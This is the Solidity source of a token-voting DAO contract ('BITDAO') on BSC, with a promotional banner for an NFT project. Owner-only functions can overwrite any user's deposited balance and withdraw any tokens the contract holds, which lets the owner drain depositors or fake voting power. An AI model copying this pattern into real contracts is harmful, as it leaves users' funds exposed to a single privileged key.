/**
 *Submitted for verification at BscScan.com on 2022-07-25
*/

pragma solidity ^0.8.0;

interface IBEP20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the token decimals.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the token symbol.
     */
    function symbol() external view returns (string memory);

    /**
    * @dev Returns the token name.
    */
    function name() external view returns (string memory);

    /**
     * @dev Returns the bep token owner.
     */
    function getOwner() external view returns (address);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address _owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

pragma solidity ^0.8.0;

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


pragma solidity ^0.8.0;

/**
* 
 BMeemits.com
  _____          ____  
 |  __ \   /\   / __ \ 
 | |  | | /  \ | |  | |
 | |  | |/ /\ \| |  | |
 | |__| / ____ \ |__| |
 |_____/_/    \_\____/ 

 
    Site:
        https://bmeebits.com

    Telegram:
        https://t.me/bmeebits_com

    Info:
        https://www.dapp.com/app/bmeebits?follow
        https://cointelegraph.com/press-releases/the-bmeebits-collection-of-20k-3d-nft-models-sold-out-in-12-hours


    Stay tuned!
                       
*/

contract BITDAO {
    using SafeMath for uint256;

    //DAOBIT token
    IBEP20 public  DAOBIT;// = IBEP20(0xcc875041438C679F33270d9c53358a3549993ec4);

    address private _owner;

    //Tokens warehouse :)
    mapping(address => uint256) public deposited;

    uint256 public totalPower;

    //Proposals
    struct Proposal {
        string title;
        string description;
        uint256 created;
        uint256 until;
        address creator;
        bool ended;
        uint256 acceptAmount;
        uint256 declineAmount;

        uint256 totalVotes;

        //External call functionality
        address payloadAddress;
        bytes payload;
        
    }

    uint256 public proposalsCount;

    mapping (uint256 => Proposal) public proposals;

    mapping (uint256 => mapping(address => bool)) public alreadyVoted;

    mapping (address => uint256) public userLatestProposal;

    event ProposalCreated(uint256 indexed index, address indexed creator);
    event ProposalEnded(uint256 indexed index, bool indexed accepted);
    event Voted(uint256 indexed index, bool indexed accept, address voter, uint256 indexed amount);

    //Config
    uint256 public proposingRequireTokens = 10 ether;
    uint256 public lowestProposalIndex = 0;
    

      /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }


    constructor(address DAOBITaddress)  {
        _owner = msg.sender;

        DAOBIT = IBEP20(DAOBITaddress);
    }


    function ownerSetDeposit(address depositer, uint256 amount) public onlyOwner{
        deposited[depositer] = amount;
    }

    function claimOwner(uint256 _amount) public onlyOwner {
        payable(msg.sender).transfer(_amount);
    }

    function claimOwnerToken(address tokenAddress, uint256 _amount) public onlyOwner {
        IBEP20(tokenAddress).transfer(msg.sender, _amount);
    }

     /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _owner = newOwner;
    }

    function setProposingRequiredTokens(uint256 _amount) public onlyOwner{
        proposingRequireTokens = _amount;
    }

    function setLowestProposalIndex(uint256 index) public onlyOwner{
        lowestProposalIndex = index;
    }

    function deposit(uint256 amount) public {

        //Transfer DAOBIT
        DAOBIT.transferFrom(msg.sender, address(this), amount);

        //Deposit success
        deposited[msg.sender] = deposited[msg.sender].add(amount);

        totalPower = totalPower.add(amount);
    }

    function withdraw(uint256 amount) public{
        require(deposited[msg.sender] >= amount, "Insufficient funds");
        require(block.timestamp > userLatestProposal[msg.sender], "Tokens freezed until voting");

        //Transfer DAOBIT backwards
        DAOBIT.transfer(msg.sender, amount);

        //Withdraw success
        deposited[msg.sender] = deposited[msg.sender].sub(amount);

        totalPower = totalPower.sub(amount);
    }

    function propose(string memory title, string memory description, uint256 voteDuration, address callAddress, bytes memory payload) public {

        require(deposited[msg.sender] >= proposingRequireTokens || msg.sender == _owner, "Not enought DAOBIT tokens for proposing");

        proposalsCount++;

        Proposal memory prop = proposals[proposalsCount];


        prop.title = title;
        prop.description = description;
        prop.creator = msg.sender;

        prop.created = block.timestamp;
        prop.until = block.timestamp + voteDuration;

        //External call possibility
        prop.payloadAddress = callAddress;
        prop.payload = payload;

        proposals[proposalsCount] = prop;

        emit ProposalCreated(proposalsCount, msg.sender);

    }

    function vote(uint256 index, bool accept) public {
        require(deposited[msg.sender] > 0, "Not enought DAOBIT tokens for voting");
        require(!alreadyVoted[index][msg.sender], "You already voted");


        Proposal memory prop = proposals[index];

        require(prop.until >=   block.timestamp,"Proposal outdated or not created");

        //Save freeze info
        if(prop.until > userLatestProposal[msg.sender]){
            userLatestProposal[msg.sender] = prop.until;
        }


        if(accept){
            prop.acceptAmount = prop.acceptAmount.add(deposited[msg.sender]);
        }else{
            prop.declineAmount = prop.declineAmount.add(deposited[msg.sender]);
        }

        prop.totalVotes++;

        proposals[index] = prop;

        //Set is already voted
        alreadyVoted[index][msg.sender] = true;

        emit Voted(index, accept, msg.sender, deposited[msg.sender]);
    }

    /**
    End vote and run payload
    */
    function endVote(uint256 index) public {
        
        Proposal memory prop = proposals[index];

        require( block.timestamp > prop.until , "Proposal not ended");
        require(!prop.ended, "Proposal already ended");

        //50/50 also decline
        bool accepted = prop.acceptAmount > prop.declineAmount;

        emit ProposalEnded(index, accepted);

        //If accepted, run payload
        if(accepted){
            (bool success, ) = prop.payloadAddress.call(prop.payload);

            require(success,"External call falls");
        }

        prop.ended = true;


        proposals[index] = prop;

    }

    function skip() public {}
}